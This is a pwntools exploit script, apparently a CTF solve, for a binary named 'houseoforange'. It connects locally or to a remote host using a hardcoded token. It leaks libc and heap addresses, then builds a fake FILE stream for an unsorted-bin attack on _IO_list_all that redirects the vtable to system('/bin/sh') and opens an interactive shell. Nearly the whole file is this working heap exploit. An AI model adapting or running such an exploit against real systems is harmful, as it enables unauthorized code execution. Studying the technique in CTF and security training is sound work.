#coding:utf-8
from pwn import *
local=1
if local:
    p=process("./houseoforange")
    #p=process("guestbook",env={"LD_PRELOAD":"./libc"})
else:
	#p=remote("localhost", 9999)
	p=remote("47.100.64.171", 20002)
	p.recvuntil("token")
	p.sendline("AVWO3WOoDIMaZPFd8pIVPGYEx35GXvrr")	
    #p=process("guestbook")
# setting for gdb terminal
# context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(proc.pidof(p)[0])

# context(arch = 'i386', os = 'linux')
# context(arch ='amd64', os = 'linux')
context.log_level='DEBUG'
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
# shellcode=asm(shellcraft.sh())

r=lambda x: p.recv(x)
ru=lambda x: p.recvuntil(x)
rud=lambda x:p.recvuntil(x,drop="true")
se=lambda x: p.send(x)
sel=lambda x: p.sendline(x)
pick32=lambda x: u32(x[:4].ljust(4,'\0'))
pick64=lambda x: u64(x[:8].ljust(8,'\0'))

libc_local32={
    'base':0x0,
    'system': 0x0003ada0,
    '__free_hook': 0x001b38b0,
    'leaked': 0x3c4b78,
	'binsh':0x0015b9ab,
	'_IO_list_all':0x3c5520,
}

libc_local64={
    'base':0x0,
    'system': 0x45390,
    '__free_hook': 0x3c67a8,
    'leaked': 0x3c4b78,
	'binsh':0x0015b9ab,
	'_IO_list_all':0x3c5520,
}

libc_remote={
    'base':0x0,
    'leaked':0x1b0da7,
	'__free_hook':0x001b18b0,
	'system':0x03a940,
	'binsh':0x0015900b,
}


elf={
    'base':0x0,
    'leaked':0xe3a,
    'free_got':0x202018,
	'global':0x3064,
	'before':0x3040,
}

if local:
    libc=libc_local64
else:
    libc=libc_remote

def set_base(mod,ref,addr):
    base=addr-mod[ref]
    for element in mod:
        mod[element] += base

def build(length,name,prize=66,color=1):
	ru("choice")
	sel("1")
	ru("name")
	sel(str(length))
	ru("Name")
	sel(name)
	ru("Orange:")
	sel(str(prize))
	ru("Orange:")
	sel(str(color))

def update(length,name,prize=66,color=1):
	ru("choice")
	sel("3")
	ru("name")
	sel(str(length))
	ru("Name")
	sel(name)
	ru("Orange")
	sel(str(prize))
	ru("Orange")
	sel(str(color))
def see():
	ru("choice")
	sel("2")

gdb.attach(p,'''
#	b *0x
	c
''')

ov="a"*56+"\xa1\x0f\00".ljust(8,"\00")
build(10,"AAAA",66,1)
update(1000,ov)
build(0xfff,"ABABABABAB")
build(0x400,"BBBBBBB")
see()
ru("BBBBBBB\n")
leak=pick64(rud("\n"))
set_base(libc,'leaked',leak)
print "[*]libc is 0x%x" % libc['base']
update(400,"a"*15)
see()
ru("a"*15+"\n")
heap=pick64(rud("\n"))
heapbase=heap-0xc0
print "[*]heapbase is 0x%x"% heapbase



raw_input()
payload = "b"*0x410
payload += p32(0xdada) + p32(0x20) + p64(0)
stream = "/bin/sh\x00" + p64(0x61) # fake file stream
stream += p64(0xddaa) + p64(libc['_IO_list_all']-0x10) # Unsortbin attack
stream = stream.ljust(0xa0,"\x00")
stream += p64(0xdeadbeef11)
stream = stream.ljust(0xc0,"\x00")
stream += p64(1)
payload += stream
payload += p64(0)
payload += p64(0)
payload += p64(0xdeadbeef22)
payload += p64(1)
payload += p64(2)
payload += p64(3) 
payload += p64(0)*3 # vtable
payload += p64(libc['system'])

update(0x800,payload,123,3)
ru(":")
#sel("1")


p.interactive()
